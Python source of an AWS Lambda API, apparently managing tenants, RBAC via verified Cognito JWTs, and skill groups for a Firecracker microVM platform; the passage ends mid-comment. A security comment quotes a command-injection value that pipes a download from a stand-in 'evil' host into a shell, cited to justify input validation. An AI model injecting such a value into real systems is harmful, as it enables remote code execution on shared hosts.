# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0

import json
import hashlib
import os
import random
import re
import time
import boto3
from botocore.exceptions import ClientError

ssm = boto3.client("ssm")
s3 = boto3.client("s3")
asg_client = boto3.client("autoscaling")
sns = boto3.client("sns")
ddb = boto3.resource("dynamodb")
tenants_table = ddb.Table(os.environ["TENANTS_TABLE"])
hosts_table = ddb.Table(os.environ["HOSTS_TABLE"])
# 1.4.0 (#62) — per-tenant / per-group skill scoping. Optional table:
# legacy deployments without GROUPS_TABLE simply skip the group-resolution
# branch in _resolve_effective_skills() and continue with broadcast behavior.
groups_table = ddb.Table(os.environ["GROUPS_TABLE"]) if os.environ.get("GROUPS_TABLE") else None
# Issue #17 — optional audit log; absent in legacy deployments
audit_table = ddb.Table(os.environ["AUDIT_TABLE"]) if os.environ.get("AUDIT_TABLE") else None
AUDIT_TTL_DAYS = int(os.environ.get("AUDIT_TTL_DAYS", "90"))

# Issue #13 — optional SNS topic for tenant lifecycle events.
# Empty string disables publishing (no-op).
NOTIFICATIONS_TOPIC_ARN = os.environ.get("NOTIFICATIONS_TOPIC_ARN", "")

# Per-host limits (from config.yml via env)
HOST_RESERVED_VCPU = int(os.environ.get("HOST_RESERVED_VCPU", 1))
HOST_RESERVED_MEM = int(os.environ.get("HOST_RESERVED_MEM", 2048))
CPU_OVERCOMMIT_RATIO = float(os.environ.get("CPU_OVERCOMMIT_RATIO", 1.0))
MEM_OVERCOMMIT_RATIO = float(os.environ.get("MEM_OVERCOMMIT_RATIO", 1.0))
# Issue #77 — absolute per-host VM ceiling, independent of the overcommit
# ratios. Even with a high ratio, packing hundreds of microVMs onto one host
# saturates its CPU and starves the control plane (SSM / health polling). 0 =
# no cap (rely on the ratio math alone). Set from config.yml host.max_vms_per_host.
MAX_VMS_PER_HOST = int(os.environ.get("MAX_VMS_PER_HOST", "0") or "0")
VM_DEFAULT_VCPU = int(os.environ.get("VM_DEFAULT_VCPU", 2))
VM_DEFAULT_MEM = int(os.environ.get("VM_DEFAULT_MEM", 4096))
VM_DATA_DISK_MB = int(os.environ.get("VM_DATA_DISK_MB", 2048))
VM_PORT_BASE = int(os.environ.get("VM_PORT_BASE", 18789))
VM_SUBNET_PREFIX = os.environ.get("VM_SUBNET_PREFIX", "172.16")
ASG_NAME = os.environ.get("ASG_NAME", "openclaw-hosts-asg")
ALB_LISTENER_ARN = os.environ.get("ALB_LISTENER_ARN", "")
VPC_ID = os.environ.get("VPC_ID", "")
elbv2 = boto3.client("elbv2")

# Issue #16 / #9 — quota ceilings (0 = unlimited; ENABLED=false → no checks)
QUOTAS_ENABLED = os.environ.get("QUOTAS_ENABLED", "false").lower() == "true"
QUOTAS_MAX_VCPU = int(os.environ.get("QUOTAS_MAX_VCPU", "0") or "0")
QUOTAS_MAX_MEM_MB = int(os.environ.get("QUOTAS_MAX_MEM_MB", "0") or "0")
QUOTAS_MAX_DATA_DISK_MB = int(os.environ.get("QUOTAS_MAX_DATA_DISK_MB", "0") or "0")

BALLOON_ENABLED = os.environ.get("BALLOON_ENABLED", "false").lower() == "true"
# Issue #72 — how to migrate a tenant when balloon (memory overcommit) is on.
# Firecracker v1.15.1 CAN snapshot a balloon VM (no documented incompatibility),
# but the balloon device can't have its stats polling disabled post-boot, and
# host-agent's balloon polling races the snapshot on FC's single-threaded API
# socket. Modes:
#   cold          (default) — stop source VM, ship its data volume, re-launch on
#                             target. Always works; costs a restart (no in-mem
#                             state). Safe universal path.
#   live          — snapshot/restore with a host-agent quiesce sentinel so the
#                   poller backs off during the pause window (preserves in-mem
#                   state). Requires the migrate-vm.sh balloon-aware path.
#   reject        — pre-1.5.9 behavior: refuse migration outright (409).
# When balloon is OFF, migration always uses the plain live snapshot path
# regardless of this setting.
BALLOON_MIGRATE_MODE = os.environ.get("BALLOON_MIGRATE_MODE", "cold").lower()

# ── 1.5.0 security hardening: Cognito JWT signature verification ──
# COGNITO_USER_POOL_ID is injected by CDK from the genuine, stack-owned pool
# (deploy/stack.py add_environment). Empty when console_auth is disabled — in
# which case signature verification is impossible and every Bearer token fails
# safe to `viewer`. AWS_REGION is provided by the Lambda runtime.
COGNITO_USER_POOL_ID = os.environ.get("COGNITO_USER_POOL_ID", "")
COGNITO_CLIENT_ID = os.environ.get("COGNITO_CLIENT_ID", "")
COGNITO_REGION = os.environ.get("AWS_REGION", "") or os.environ.get("AWS_DEFAULT_REGION", "")
# Fall-back role for requests with NO Bearer token (API-key-only path).
# "viewer" = least privilege (fail-safe). Trusted automation that needs write
# access must present a Cognito id_token.
DEFAULT_NO_JWT_ROLE = os.environ.get("DEFAULT_NO_JWT_ROLE", "viewer")
# RBAC role-gating is its own switch, independent of console_auth (Cognito login). 
# Default OFF: login can be required for the console UI without forcing every write to carry a Cognito id_token. 
# Set RBAC_ENABLED=true to enforce per-route role checks (viewer/operator/admin).
RBAC_ENABLED = os.environ.get("RBAC_ENABLED", "false").lower() == "true"

# Lazily-built, module-cached JWKS client. Cognito rotates signing keys
# rarely; PyJWKClient caches fetched keys in-process, so we pay the JWKS
# HTTP fetch at most once per cold container (and on key rotation).
_JWKS_CLIENT = None


def _get_jwks_client():
    """Return a cached PyJWKClient for the configured Cognito pool, or None.

    None means verification is impossible (no pool id, or PyJWT/cryptography
    unavailable) — callers must then fail safe.
    """
    global _JWKS_CLIENT
    if not COGNITO_USER_POOL_ID or not COGNITO_REGION:
        return None
    if _JWKS_CLIENT is not None:
        return _JWKS_CLIENT
    try:
        import jwt  # PyJWT — bundled into the Lambda asset (requirements.txt)
        jwks_url = (
            f"https://cognito-idp.{COGNITO_REGION}.amazonaws.com/"
            f"{COGNITO_USER_POOL_ID}/.well-known/jwks.json"
        )
        _JWKS_CLIENT = jwt.PyJWKClient(jwks_url)
        return _JWKS_CLIENT
    except Exception:
        # Import error or malformed config → cannot verify → fail safe.
        return None


def _verify_and_decode(token):
    """Verify a Cognito id_token's RS256 signature and return its claims.

    Returns the decoded claims dict on success, or None if the token cannot be
    cryptographically trusted (bad/alg:none signature, expired, wrong issuer,
    or verification is unavailable). Callers MUST treat None as untrusted and
    fall back to least privilege — NEVER read claims from an unverified token.
    """
    client = _get_jwks_client()
    if client is None or not token:
        return None
    try:
        import jwt
        signing_key = client.get_signing_key_from_jwt(token)
        issuer = (
            f"https://cognito-idp.{COGNITO_REGION}.amazonaws.com/"
            f"{COGNITO_USER_POOL_ID}"
        )
        # verify_aud is OFF: Cognito id_tokens carry `aud`=app client id, but
        # access_tokens use `client_id` and omit `aud`. We accept either token
        # type for RBAC (the signature + issuer are what establish trust). If a
        # client id is configured we still cross-check it below, best-effort.
        claims = jwt.decode(
            token,
            signing_key.key,
            algorithms=["RS256"],
            issuer=issuer,
            options={"verify_aud": False, "require": ["exp", "iss"]},
        )
        # Best-effort audience pinning: reject tokens minted for a DIFFERENT
        # Cognito app client when we know our own client id.
        if COGNITO_CLIENT_ID:
            aud = claims.get("aud") or claims.get("client_id")
            if aud and aud != COGNITO_CLIENT_ID:
                return None
        return claims
    except Exception:
        # Any verification failure (signature, expiry, issuer, alg) → untrusted.
        return None



# ════════════════════════════════════════════════════════════
# RBAC (issue #14)
# ════════════════════════════════════════════════════════════
#
# Cognito User Pool Groups carry the role assignment as a
# `cognito:groups` claim on the id_token. The console attaches the
# token as `Authorization: Bearer …`. As of 1.5.0 we VERIFY the JWT's
# RS256 signature against the pool's JWKS before trusting any claim
# (_verify_and_decode). A token that fails verification — forged,
# expired, alg:none, wrong issuer/audience — is treated as untrusted and
# the caller is downgraded to `viewer` (least privilege).
#
# Fail-safe default: a request with NO Bearer token (API-key-only path)
# resolves to DEFAULT_NO_JWT_ROLE (default `viewer`), NOT admin. This
# closes the pre-1.5.0 fail-open hole where missing/forged tokens granted
# full access. Trusted automation must present a real Cognito id_token.

_ROLE_RANK = {"viewer": 0, "operator": 1, "admin": 2}

# Endpoints that read state are open to viewers; everything else
# requires operator+ by default. Admin-only endpoints can be added here.
_VIEWER_OK = {
    ("GET", "/tenants"), ("GET", "/tenants/{id}"),
    ("GET", "/tenants/{id}/{action}"),
    ("GET", "/backups"), ("GET", "/hosts"),
    ("GET", "/hosts/rootfs-version"), ("GET", "/agentcore/status"),
    ("GET", "/agentcore/tools"), ("GET", "/system/info"),
    ("GET", "/audit-log"),
    # 1.4.0 (#62) — listing groups is read-only.
    ("GET", "/groups"),
    # 1.4.1 (#63) — read individual SKILL.md content (editor / viewer)
    ("GET", "/skills/{name}"),
}


def _role_from_claims(claims):
    """Map a verified claims dict → highest-privilege role, else 'viewer'."""
    groups = (claims or {}).get("cognito:groups", []) or []
    if isinstance(groups, str):
        groups = [groups]
    best = None
    for g in groups:
        if g in _ROLE_RANK and (best is None or _ROLE_RANK[g] > _ROLE_RANK[best]):
            best = g
    return best or "viewer"


def _get_user_role(event):
    """Return the caller's role from a SIGNATURE-VERIFIED Cognito id_token.

    Fail-safe (1.5.0):
      • No Bearer token            → DEFAULT_NO_JWT_ROLE (default: viewer).
      • Token present, unverifiable → viewer (forged/expired/alg:none → denied).
      • Token verified             → role from cognito:groups (admin>operator>viewer).

    This replaces the pre-1.5.0 behavior where a missing token meant `admin`
    (fail-open) and claims were trusted without verifying the signature (any
    attacker could forge `{"cognito:groups":["admin"]}`).
    """
    headers = event.get("headers") or {}
    # API Gateway lower-cases header names but real-world clients vary.
    auth = headers.get("Authorization") or headers.get("authorization") or ""
    if not auth.startswith("Bearer "):
        # No JWT → API key-only path. Fail safe to the configured default.
        return DEFAULT_NO_JWT_ROLE
    token = auth[len("Bearer "):].strip()
    claims = _verify_and_decode(token)
    if claims is None:
        # Token present but could not be cryptographically trusted → deny.
        return "viewer"
    return _role_from_claims(claims)


def _role_satisfies(actual, required):
    """True iff `actual` has at least the privilege of `required`."""
    return _ROLE_RANK.get(actual, -1) >= _ROLE_RANK.get(required, 99)


def _get_principal(event):
    """Resolve the human/actor behind a request for the audit log (issue #71).

    Returns (actor, role):
      • Verified Cognito id_token → (email or cognito:username or sub, role).
      • No/invalid token          → (f"api-key:{apiKeyId}", DEFAULT_NO_JWT_ROLE).

    _get_user_role already verifies the signature; here we ALSO surface the
    principal identity (which _get_user_role discards) so the audit trail names
    the person, not the shared API key.
    """
    headers = event.get("headers") or {}
    auth = headers.get("Authorization") or headers.get("authorization") or ""
    if auth.startswith("Bearer "):
        claims = _verify_and_decode(auth[len("Bearer "):].strip())
        if claims is not None:
            actor = (claims.get("email") or claims.get("cognito:username")
                     or claims.get("sub") or "cognito-user")
            return actor, _role_from_claims(claims)
    # No verifiable JWT → API-key path. Use the same api_key_id the audit row
    # already records, prefixed so the UI can tell it apart from a real person.
    api_key_id = (event.get("requestContext") or {}).get("identity", {}).get("apiKeyId") \
        or ((event.get("headers") or {}).get("x-api-key", "") or "")[:32]
    return (f"api-key:{api_key_id}" if api_key_id else "api-key"), DEFAULT_NO_JWT_ROLE


def _resolve_effective_skills(tenant_item):
    """Compute the set of skill names a tenant should receive at launch time.

    1.4.0 (#62): per-tenant / per-group skill distribution.

    Returns:
        None  → tenant has no per-tenant or group scope set; launch-vm.sh
                 falls back to broadcast (legacy v1.3.x behavior).
        list  → sorted unique list of skill names from
                 (tenant.skills) ∪ (groups[tenant.group].skills).
                 If the union is empty, also returns None to avoid lock-out
                 (an explicit empty-list scope would otherwise prevent any
                 skill from reaching the VM, which is rarely intended).

    Unknown groups are silently dropped from the union — the operator gets
    a warning at /groups admin time, not at every launch.
    """
    if not tenant_item:
        return None
    tenant_skills = tenant_item.get("skills") or []
    group_name = (tenant_item.get("group") or "").strip()
    # No scoping configured → broadcast.
    if not tenant_skills and not group_name:
        return None

    effective = set(s for s in tenant_skills if s)
    if group_name and groups_table is not None:
        try:
            grp = groups_table.get_item(Key={"name": group_name}).get("Item") or {}
            for s in (grp.get("skills") or []):
                if s:
                    effective.add(s)
        except Exception:
            # Group lookup failure is non-fatal — proceed with tenant.skills only.
            pass

    return sorted(effective) if effective else None


# ============================================================
# Groups CRUD (1.4.0 / #62)
# ============================================================

def list_groups():
    """GET /groups — list all groups."""
    if groups_table is None:
        return _resp(503, {"error": "groups table not configured (1.3.x deployment?)"})
    try:
        resp = groups_table.scan()
        return _resp(200, {"groups": resp.get("Items", [])})
    except Exception as e:
        return _resp(500, {"error": str(e)})


def create_group(body_str):
    """POST /groups — create a new group with optional initial skills.

    Body: {"name": "team-sre", "skills": ["a", "b"], "description": "..."}
    """
    if groups_table is None:
        return _resp(503, {"error": "groups table not configured (1.3.x deployment?)"})
    try:
        body = json.loads(body_str or "{}")
    except json.JSONDecodeError:
        return _resp(400, {"error": "invalid JSON"})
    name = (body.get("name") or "").strip()
    if not name:
        return _resp(400, {"error": "name is required"})
    # Reuse tenant DNS-label rules — group names show up in audit logs and
    # potentially in DNS-related artifacts later, so keep them safe.
    if not _NAME_RE.match(name):
        return _resp(400, {"error": "name must match ^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$"})
    skills = body.get("skills") or []
    if not isinstance(skills, list) or not all(isinstance(s, str) for s in skills):
        return _resp(400, {"error": "skills must be a list of strings"})
    description = (body.get("description") or "").strip()
    from datetime import datetime, timezone
    item = {
        "name": name,
        "skills": sorted(set(s for s in skills if s)),
        "description": description,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    try:
        groups_table.put_item(
            Item=item,
            ConditionExpression="attribute_not_exists(#n)",
            ExpressionAttributeNames={"#n": "name"},
        )
    except groups_table.meta.client.exceptions.ConditionalCheckFailedException:
        return _resp(409, {"error": f"group '{name}' already exists"})
    except Exception as e:
        return _resp(500, {"error": str(e)})
    return _resp(201, item)


def add_skill_to_group(name, body_str):
    """POST /groups/{name}/skills — append a skill to a group's list (idempotent)."""
    if groups_table is None:
        return _resp(503, {"error": "groups table not configured"})
    try:
        body = json.loads(body_str or "{}")
    except json.JSONDecodeError:
        return _resp(400, {"error": "invalid JSON"})
    skill = (body.get("skill") or "").strip()
    if not skill:
        return _resp(400, {"error": "skill is required"})
    try:
        existing = groups_table.get_item(Key={"name": name}).get("Item")
        if not existing:
            return _resp(404, {"error": f"group '{name}' not found"})
        cur = set(existing.get("skills") or [])
        cur.add(skill)
        groups_table.update_item(
            Key={"name": name},
            UpdateExpression="SET skills = :s",
            ExpressionAttributeValues={":s": sorted(cur)},
        )
        return _resp(200, {"name": name, "skills": sorted(cur)})
    except Exception as e:
        return _resp(500, {"error": str(e)})


def remove_skill_from_group(name, skill):
    """DELETE /groups/{name}/skills/{skill} — remove a skill from a group's list."""
    if groups_table is None:
        return _resp(503, {"error": "groups table not configured"})
    try:
        existing = groups_table.get_item(Key={"name": name}).get("Item")
        if not existing:
            return _resp(404, {"error": f"group '{name}' not found"})
        cur = set(existing.get("skills") or [])
        cur.discard(skill)
        groups_table.update_item(
            Key={"name": name},
            UpdateExpression="SET skills = :s",
            ExpressionAttributeValues={":s": sorted(cur)},
        )
        return _resp(200, {"name": name, "skills": sorted(cur)})
    except Exception as e:
        return _resp(500, {"error": str(e)})


# ========== Skills CRUD (1.4.1 #63 — Console skills management) ==========
#
# Read/write SKILL.md content directly via API so the operator console
# can offer in-browser edit/upload/delete without requiring an AWS
# credentials shell. GET /skills (list) stays in the dedicated skills
# Lambda; the per-name CRUD lives here so we reuse the existing
# RBAC + audit-log infrastructure.

_SKILL_NAME_RE = re.compile(r"^[a-z0-9]([a-z0-9-]{0,62}[a-z0-9])?$")
_SKILL_MAX_BYTES = 256 * 1024  # 256 KiB — generous, an SKILL.md should be tiny


def read_skill(name):
    """GET /skills/{name} — return the SKILL.md content for the editor.

    Returns 404 if the skill does not exist (no SKILL.md under the
    s3://${ASSETS_BUCKET}/skills/{name}/ prefix). Body is text/plain
    in the JSON `content` field so the console can drop it straight
    into a textarea.
    """
    if not _SKILL_NAME_RE.match(name or ""):
        return _resp(400, {"error": "invalid skill name"})
    bucket = os.environ.get("ASSETS_BUCKET", "")
    if not bucket:
        return _resp(503, {"error": "ASSETS_BUCKET not configured"})
    key = f"skills/{name}/SKILL.md"
    try:
        obj = s3.get_object(Bucket=bucket, Key=key)
        content = obj["Body"].read().decode("utf-8", errors="replace")
        return _resp(200, {
            "name": name,
            "content": content,
            "size": obj.get("ContentLength", len(content)),
            "last_modified": obj.get("LastModified").isoformat() if obj.get("LastModified") else None,
        })
    except s3.exceptions.NoSuchKey:
        return _resp(404, {"error": f"skill '{name}' not found"})
    except Exception as e:
        # Some SDKs throw a generic ClientError with code "NoSuchKey"
        msg = str(e)
        if "NoSuchKey" in msg or "404" in msg:
            return _resp(404, {"error": f"skill '{name}' not found"})
        return _resp(500, {"error": msg})


def update_skill(name, body_str):
    """PUT /skills/{name} — create or replace the skill's SKILL.md.

    Body: {"content": "<markdown>"}. The content must:
      - be valid UTF-8
      - be ≤ _SKILL_MAX_BYTES
      - contain at least one top-level "# Title" line

    The S3 cron sync on each host picks the new file up within 5 min,
    after which new VMs will receive it at launch.
    """
    if not _SKILL_NAME_RE.match(name or ""):
        return _resp(400, {"error": "invalid skill name (lowercase letters, digits, hyphens)"})
    try:
        body = json.loads(body_str or "{}")
    except json.JSONDecodeError:
        return _resp(400, {"error": "invalid JSON body"})
    content = body.get("content")
    if not isinstance(content, str) or not content.strip():
        return _resp(400, {"error": "missing or empty 'content' field"})
    if len(content.encode("utf-8")) > _SKILL_MAX_BYTES:
        return _resp(400, {"error": f"content exceeds {_SKILL_MAX_BYTES} bytes"})
    # Require a top-level Markdown heading so empty stubs don't end up published.
    has_h1 = any(
        ln.lstrip().startswith("# ") and ln.lstrip()[2:].strip()
        for ln in content.splitlines()
    )
    if not has_h1:
        return _resp(400, {"error": "SKILL.md must contain at least one top-level '# Title' line"})
    bucket = os.environ.get("ASSETS_BUCKET", "")
    if not bucket:
        return _resp(503, {"error": "ASSETS_BUCKET not configured"})
    key = f"skills/{name}/SKILL.md"
    try:
        # Detect whether this is a create or replace for a more useful response.
        try:
            s3.head_object(Bucket=bucket, Key=key)
            existed = True
        except Exception:
            existed = False
        s3.put_object(
            Bucket=bucket,
            Key=key,
            Body=content.encode("utf-8"),
            ContentType="text/markdown; charset=utf-8",
        )
        return _resp(200 if existed else 201, {
            "name": name,
            "size": len(content.encode("utf-8")),
            "created": not existed,
        })
    except Exception as e:
        return _resp(500, {"error": str(e)})


def delete_skill(name):
    """DELETE /skills/{name} — remove the entire skills/{name}/ prefix.

    Removes SKILL.md plus any auxiliary files the operator may have
    uploaded under the skill's prefix (images, sub-docs, etc.).
    Idempotent: 404 if the skill never existed, 200 once it's gone.
    """
    if not _SKILL_NAME_RE.match(name or ""):
        return _resp(400, {"error": "invalid skill name"})
    bucket = os.environ.get("ASSETS_BUCKET", "")
    if not bucket:
        return _resp(503, {"error": "ASSETS_BUCKET not configured"})
    prefix = f"skills/{name}/"
    try:
        # List & batch-delete (S3 has no recursive delete)
        paginator = s3.get_paginator("list_objects_v2")
        keys = []
        for page in paginator.paginate(Bucket=bucket, Prefix=prefix):
            for obj in page.get("Contents", []):
                keys.append({"Key": obj["Key"]})
        if not keys:
            return _resp(404, {"error": f"skill '{name}' not found"})
        # delete_objects max 1000 per call — way more than we'd ever have
        # in a single skill prefix, but loop defensively anyway.
        for i in range(0, len(keys), 1000):
            s3.delete_objects(Bucket=bucket, Delete={"Objects": keys[i:i + 1000]})
        return _resp(200, {"name": name, "deleted": len(keys)})
    except Exception as e:
        return _resp(500, {"error": str(e)})


def _rbac_check(event, method, resource):
    """Return None if allowed, else a 403 response."""
    if not RBAC_ENABLED:
        return None  # role-gating disabled — all routes open
    role = _get_user_role(event)
    needed = "viewer" if (method, resource) in _VIEWER_OK else "operator"
    if not _role_satisfies(role, needed):
        return _resp(403, {
            "error": "forbidden",
            "rbac": {"role": role, "required": needed},
        })
    return None


def lambda_handler(event, context):
    # EventBridge: new host InService → process pending tenants
    if event.get("source") == "aws.autoscaling":
        detail_type = event.get("detail-type", "")
        if "terminate" in detail_type.lower():
            return cleanup_terminated_host(event)
        return process_pending()

    method = event["httpMethod"]
    resource = event["resource"]
    path_params = event.get("pathParameters") or {}

    routes = {
        ("GET", "/tenants"): lambda: list_tenants(
            event.get("queryStringParameters") or {},
            event.get("multiValueQueryStringParameters") or {},
        ),
        ("POST", "/tenants"): lambda: create_tenant(event.get("body")),
        ("GET", "/tenants/{id}"): lambda: get_tenant(path_params["id"]),
        ("DELETE", "/tenants/{id}"): lambda: delete_tenant(
            path_params["id"], event.get("queryStringParameters") or {}
        ),
        ("POST", "/tenants/{id}/{action}"): lambda: tenant_action(
            path_params["id"], path_params["action"], event.get("body")
        ),
        ("GET", "/tenants/{id}/{action}"): lambda: tenant_get_action(
            path_params["id"], path_params["action"]
        ),
        ("GET", "/backups"): list_all_backups,
        ("POST", "/batch/tenants"): lambda: batch_tenants(event.get("body")),
        ("GET", "/hosts"): list_hosts,
        ("POST", "/hosts"): lambda: register_host(event.get("body")),
        ("POST", "/hosts/refresh-rootfs"): refresh_rootfs,
        ("GET", "/hosts/rootfs-version"): rootfs_version,
        ("GET", "/agentcore/status"): agentcore_status,
        ("GET", "/agentcore/tools"): agentcore_tools,
        ("GET", "/system/info"): system_info,
        ("GET", "/audit-log"): lambda: _list_audit_log(event.get("queryStringParameters") or {}),
        ("DELETE", "/hosts/{instance_id}"): lambda: deregister_host(
            path_params["instance_id"]
        ),
        # 1.4.0 (#62) — per-tenant / per-group skill scoping
        ("GET", "/groups"): list_groups,
        ("POST", "/groups"): lambda: create_group(event.get("body")),
        ("POST", "/groups/{name}/skills"): lambda: add_skill_to_group(
            path_params["name"], event.get("body")
        ),
        ("DELETE", "/groups/{name}/skills/{skill}"): lambda: remove_skill_from_group(
            path_params["name"], path_params["skill"]
        ),
        # 1.4.1 (#63) — Console skills CRUD
        ("GET", "/skills/{name}"): lambda: read_skill(path_params["name"]),
        ("PUT", "/skills/{name}"): lambda: update_skill(path_params["name"], event.get("body")),
        ("DELETE", "/skills/{name}"): lambda: delete_skill(path_params["name"]),
    }

    handler = routes.get((method, resource))
    if not handler:
        return _resp(404, {"error": "not found"})
    # RBAC enforcement — checked AFTER routing so unknown paths still 404.
    forbidden = _rbac_check(event, method, resource)
    if forbidden is not None:
        return forbidden
    try:
        result = handler() if callable(handler) else handler
        # Issue #17 — audit-log mutating operations after they run so the
        # response_status is captured. GET requests skip auditing to avoid
        # noise; the audit-log route itself is read-only.
        if method in ("POST", "PUT", "DELETE"):
            _audit_write(method, resource, path_params, event, result)
        return result
    except Exception as e:
        import traceback
        traceback.print_exc()
        return _resp(500, {"error": str(e)})


# ========== Tenant Operations ==========


def list_tenants(query_params=None, multi_query_params=None):
    items = tenants_table.scan(
        FilterExpression="#s <> :d",
        ExpressionAttributeNames={"#s": "status"},
        ExpressionAttributeValues={":d": "deleted"},
    ).get("Items", [])
    # Ensure every record exposes a tags field so the console can render it
    for it in items:
        it.setdefault("tags", {})

    # Issue #10 — optional ?tag=key:value filter (AND across multiple)
    tag_filters = _collect_tag_filters(query_params, multi_query_params)
    if tag_filters:
        items = [it for it in items if _matches_all_tags(it, tag_filters)]

    return _resp(200, items)


def get_tenant(tenant_id):
    item = tenants_table.get_item(Key={"id": tenant_id}).get("Item")
    if not item:
        return _resp(404, {"error": "tenant not found"})
    item.setdefault("tags", {})
    # 1.4.0 (#62) — surface the resolved effective skill set to the caller.
    # None means "broadcast all" (legacy behavior); a list means scoping is
    # active and only those skills will be injected at next launch.
    eff = _resolve_effective_skills(item)
    item["effective_skills"] = eff if eff is not None else "*"
    return _resp(200, item)


def create_tenant(body=None):
    if body is None:
        return _resp(400, {"error": "missing body"})
    body = json.loads(body) if isinstance(body, str) else body

    name = body.get("name", "")
    name_err = _validate_name(name)
    if name_err:
        return _resp(400, {"error": name_err})
    vcpu = int(body.get("vcpu", VM_DEFAULT_VCPU))
    mem_mb = int(body.get("mem_mb", VM_DEFAULT_MEM))
    data_disk_mb = int(body.get("data_disk_mb", VM_DATA_DISK_MB))

    # Issue #9 — quota check (no-op when env vars unset).
    quota_err = _check_quota(vcpu, mem_mb, data_disk_mb)
    if quota_err:
        return _resp(400, {"error": quota_err})

    config_template = body.get("config_template", "")
    # SECURITY: config_template is interpolated verbatim into the root SSM
    # command that launches the VM (_launch_vm → launch-vm.sh arg 5). It MUST
    # be a bare template name, never shell metacharacters — otherwise a request
    # like config_template="x; curl evil|sh #" is arbitrary root RCE on a
    # shared host. Same allow-list as skill names (both are S3 subdir names).
    if config_template and not _SKILL_NAME_RE.match(config_template):
        return _resp(400, {"error": "config_template must match "
                                    "^[a-z0-9]([a-z0-9-]{0,62}[a-z0-9])?$"})
    restore_from = body.get("restore_from")
    clone_from = body.get("clone_from")

    # 1.4.0 (#62) — per-tenant skill list and optional group membership.
    # Validate up-front so we don't half-create a tenant with a malformed scope.
    skills_in = body.get("skills")
    if skills_in is not None:
        if not isinstance(skills_in, list) or not all(isinstance(s, str) for s in skills_in):
            return _resp(400, {"error": "skills must be a list of strings"})
        skills_in = sorted(set(s.strip() for s in skills_in if s and s.strip()))
        # SECURITY: each skill name is joined into the same root SSM command
        # (launch-vm.sh arg 7, comma-separated). Reject metacharacters — same
        # command-injection vector as config_template above.
        bad = [s for s in skills_in if not _SKILL_NAME_RE.match(s)]
        if bad:
            return _resp(400, {"error": f"invalid skill name(s): {bad} — must match "
                                        "^[a-z0-9]([a-z0-9-]{0,62}[a-z0-9])?$"})
    group_in = (body.get("group") or "").strip()
    if group_in and not _NAME_RE.match(group_in):
        return _resp(400, {"error": "group must match ^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$"})
    if group_in and groups_table is not None:
        # Soft-validate: warn at create time if the group doesn't exist yet,
        # rather than silently allowing a typo to drop tenant from any scope.
        try:
            grp_chk = groups_table.get_item(Key={"name": group_in}).get("Item")
            if not grp_chk:
                return _resp(404, {"error": f"group '{group_in}' not found — create it first via POST /groups"})
        except Exception:
            pass

    # Issue #12 — clone_from is mutually exclusive with restore_from
    if clone_from and restore_from:
        return _resp(400, {"error": "clone_from and restore_from are mutually exclusive"})

    # Resolve clone source: must exist + be running. Forces same-host scheduling.
    clone_src = None
    if clone_from:
        clone_src = tenants_table.get_item(Key={"id": clone_from}).get("Item")
        if not clone_src:
            return _resp(404, {"error": f"clone source not found: {clone_from}"})
        if clone_src.get("status") != "running":
            return _resp(400, {
                "error": f"clone source must be running (current: {clone_src.get('status')})"
            })

    # Issue #10 — validate tags up-front (fail fast before any side effects)
    tags_err = _validate_tags(body.get("tags"))
    if tags_err:
        return _resp(400, {"error": tags_err})
    tags = body.get("tags") or {}

    # Issue #15 — optional TTL fields
    ttl_fields, ttl_err = _parse_ttl(body.get("ttl_hours"), body.get("on_expiry"))
    if ttl_err:
        return _resp(400, {"error": ttl_err})

    # Issue #11 — optional `schedule` field; validated then persisted.
    sched, sched_err = _parse_schedule(body.get("schedule"))
    if sched_err:
        return _resp(400, {"error": sched_err})

    restore_backup_key = ""
    if restore_from:
        src_id = restore_from.get("tenant_id")
        if not src_id:
            return _resp(400, {"error": "restore_from.tenant_id required"})
        ts = restore_from.get("timestamp")
        restore_backup_key = _resolve_backup(src_id, ts)
        if not restore_backup_key:
            if ts:
                return _resp(404, {"error": f"backup not found: {src_id}/{ts}"})
            return _resp(404, {"error": f"no backups found for tenant_id={src_id}"})

    tenant_id = _gen_id(name)
    now = _now()

    # Find host with capacity. The scheduler is normally automatic, but
    # operators occasionally need to pin a tenant to a specific host (e.g.
    # to drain a host before terminating it, or to keep two related VMs on
    # the same hardware). Three modes, in priority order:
    #   1. clone_from → must land on the source's host (local `cp` only)
    #   2. preferred_host_id (admin/operator) → land there or fail
    #   3. default → first host with capacity
    preferred_host_id = (body.get("preferred_host_id") or "").strip()
    if clone_src:
        host = _get_specific_host_with_capacity(clone_src["host_id"], vcpu, mem_mb)
        if not host:
            return _resp(400, {
                "error": f"clone source's host {clone_src['host_id']} lacks "
                         f"capacity for clone (vcpu={vcpu}, mem_mb={mem_mb})"
            })
    elif preferred_host_id:
        host = _get_specific_host_with_capacity(preferred_host_id, vcpu, mem_mb)
        if not host:
            # Distinguish "host doesn't exist" from "host full" so the
            # console can render the right message.
            existing = hosts_table.get_item(Key={"instance_id": preferred_host_id}).get("Item")
            if not existing or existing.get("status") in ("deleted", "draining"):
                return _resp(404, {"error": f"preferred_host_id {preferred_host_id} not found or draining"})
            return _resp(400, {
                "error": f"preferred_host_id {preferred_host_id} lacks capacity "
                         f"(vcpu={vcpu}, mem_mb={mem_mb})"
            })
    else:
        host = _find_host(vcpu, mem_mb)
    if not host:
        # No capacity — save as pending and scale out.
        # Persist config_template and restore_backup_key so process_pending() can apply them.
        item = {
            "id": tenant_id, "name": name,
            "vcpu": vcpu, "mem_mb": mem_mb,
            "status": "pending",
            "health_failures": 0,
            "config_template": config_template,
            "restore_backup_key": restore_backup_key,
            "tags": tags,
            "created_at": now, "updated_at": now,
        }
        if skills_in is not None:
            item["skills"] = skills_in
        if group_in:
            item["group"] = group_in
        item.update(ttl_fields)
        if sched:
            item["schedule"] = sched
        tenants_table.put_item(Item=item)
        _scale_out()
        _publish_event("tenant.created", tenant_id, {
            "name": name, "vcpu": vcpu, "mem_mb": mem_mb, "status": "pending",
        })
        return _resp(201, {"id": tenant_id, "status": "pending", "message": "scaling out, VM will be created when host is ready"})

    # Issue #77: atomically RESERVE the host slot before writing the tenant.
    # The old code read next_vm_num from a stale scan, wrote the tenant, then
    # bumped the host counters with no condition — so two concurrent creates
    # could (a) both pass the earlier capacity check and overcommit the host,
    # and (b) derive the SAME vm_num (→ duplicate guest_ip / host_port). The
    # reservation is a single conditional UpdateItem: it books capacity only if
    # the host still has room and returns a unique, atomically-incremented
